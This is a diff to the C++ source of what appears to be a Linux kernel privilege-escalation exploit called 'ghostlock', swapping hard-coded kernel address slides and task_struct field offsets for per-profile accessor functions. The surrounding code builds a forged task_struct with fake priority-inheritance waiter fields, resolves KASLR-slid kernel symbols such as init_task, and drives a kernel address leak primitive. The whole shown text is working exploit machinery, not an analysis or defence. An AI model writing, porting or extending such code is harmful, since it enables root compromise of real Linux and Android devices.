@@ -117,11 +117,11 @@ namespace ghostlock::support {
                    (unsigned long long)g_exploit_session.addresses.phys_load(),
                    (unsigned long long)(g_exploit_session.addresses.phys_load() -
                        P0_PHYS_OFFSET),
-                   (unsigned long long)SLIDE_NFULNL_LOGGER,
-                   (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
-                   (unsigned long long)SLIDE_INIT_TASK,
-                   (unsigned long long)SLIDE_ROOT_TASK_GROUP,
-                   (unsigned long long)SLIDE_SYSCTL_BOOTID);
+                   (unsigned long long)ghostlock::profile::slide_nfulnl_logger(),
+                   (unsigned long long)ghostlock::profile::slide_random_boot_id_data(),
+                   (unsigned long long)ghostlock::profile::slide_init_task(),
+                   (unsigned long long)ghostlock::profile::slide_root_task_group(),
+                   (unsigned long long)ghostlock::profile::slide_sysctl_bootid());
     }
 
     void disable_rseq_for_thread(void) {
@@ -326,11 +326,11 @@ namespace ghostlock::support {
         uintptr_t write_right = (g_exploit_session.heap.current.fake_right);
         uintptr_t write_left = (g_exploit_session.heap.current.fake_left);
         /* Direct-map aliases (data_addr) resolve to the same physical pages and are
-         * dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK
+         * dereferenceable on every SoC — the tcp route already uses ghostlock::profile::slide_init_task()
          * the same way for the on-stack waiter (upstream U01-D). */
-        uint64_t waiter_task = SLIDE_INIT_TASK;
-        uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
-        uint64_t pi_top_task = SLIDE_INIT_TASK;
+        uint64_t waiter_task = ghostlock::profile::slide_init_task();
+        uint64_t task_group = ghostlock::profile::slide_root_task_group();
+        uint64_t pi_top_task = ghostlock::profile::slide_init_task();
 
         const struct kernel_offsets *v = profile_values();
         int compact = g_exploit_session.profile.has_compact_waiter();
@@ -386,25 +386,25 @@ namespace ghostlock::support {
             /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
             uint32_t ft_prio_off = compact
                                        ? v->task_prio
-                                       : FAKE_TASK_PRIO_OFF;
+                                       : ghostlock::profile::fake_task_prio_off();
             uint32_t ft_nprio_off = compact
                                         ? v->task_normal_prio
-                                        : FAKE_TASK_NORMAL_PRIO_OFF;
+                                        : ghostlock::profile::fake_task_normal_prio_off();
             uint32_t ft_tg_off = compact
                                      ? v->task_sched_task_group
-                                     : FAKE_TASK_TASK_GROUP_OFF;
+                                     : ghostlock::profile::fake_task_task_group_off();
             uint32_t ft_pi_lock_off = compact
                                           ? v->task_pi_lock
-                                          : FAKE_TASK_PI_LOCK_OFF;
+                                          : ghostlock::profile::fake_task_pi_lock_off();
             uint32_t ft_pi_wait_off = compact
                                           ? v->task_pi_waiters
-                                          : FAKE_TASK_PI_WAITERS_OFF;
+                                          : ghostlock::profile::fake_task_pi_waiters_off();
             uint32_t ft_pi_top_off = compact
                                          ? v->task_pi_top_task
-                                         : FAKE_TASK_PI_TOP_TASK_OFF;
+                                         : ghostlock::profile::fake_task_pi_top_task_off();
             uint32_t ft_pi_blocked_off = compact
                                              ? v->task_pi_blocked_on
-                                             : FAKE_TASK_PI_BLOCKED_ON_OFF;
+                                             : ghostlock::profile::fake_task_pi_blocked_on_off();
 
             put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
             put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
@@ -465,7 +465,7 @@ namespace ghostlock::support {
         int cpu_count = (int) sysconf(_SC_NPROCESSORS_ONLN);
         kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
             g_exploit_session.profile.mm_struct_stride(MM_STRUCT_SZ),
-            MM_ORDER, (size_t) cpu_count, kernelsnitch_collisions(), 0,
+            MM_ORDER, (size_t) cpu_count, ghostlock::profile::kernelsnitch_collisions(), 0,
             (size_t) runtime_config_snapshot().main_cpu);
         /* The forked leak child borrows the shared mmap context through this
          * compatibility alias; the owner remains the only releaser. */
